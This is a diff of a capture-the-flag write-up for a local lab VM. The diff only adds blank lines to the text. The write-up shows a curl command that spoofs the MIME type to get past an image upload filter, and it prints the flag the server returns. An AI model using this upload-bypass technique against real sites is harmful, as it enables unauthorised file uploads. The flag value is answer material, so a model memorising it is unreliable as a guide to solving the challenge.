@@ -47,6 +47,7 @@ MAC Address: 08:00:27:CD:44:94 (Oracle VirtualBox virtual NIC)
 i> We can also access this page using the `ADD IMAGE` button from the **home page**
 
 When we visit the **upload** page (http://192.168.1.23:80/?page=upload) we see the following
+
 ![upload page](/.resources/images/upload_index.png)
 
 We can see there is a `brows` button and there is a `UPLOAD` button. On top of all the button it says **Choose an image to upload**. From this we can guess that we have to upload an **image** file.
@@ -85,6 +86,7 @@ Using curl we can easily upload a file with a the `type` name we want. Here is o
 ```bash
 url -s -F "uploaded=@img.png;type=image/jpeg" -F Upload=Upload "http://192.168.1.23/?page=upload" | grep flag
 ```
+
 |Option|Description|
 |--|--|
 |`-s` | Silent|
@@ -95,6 +97,7 @@ this gives us the following result
 ```bash
 <pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/img.png succesfully uploaded.</pre>
 ```
+
 ?> We use the `;type=image/jpeg` to tell the server that this has a file type of an `image` 
 ?> After some playing arround we can see that the `MAX_FILE_SIZE` parameter is not needed.
 
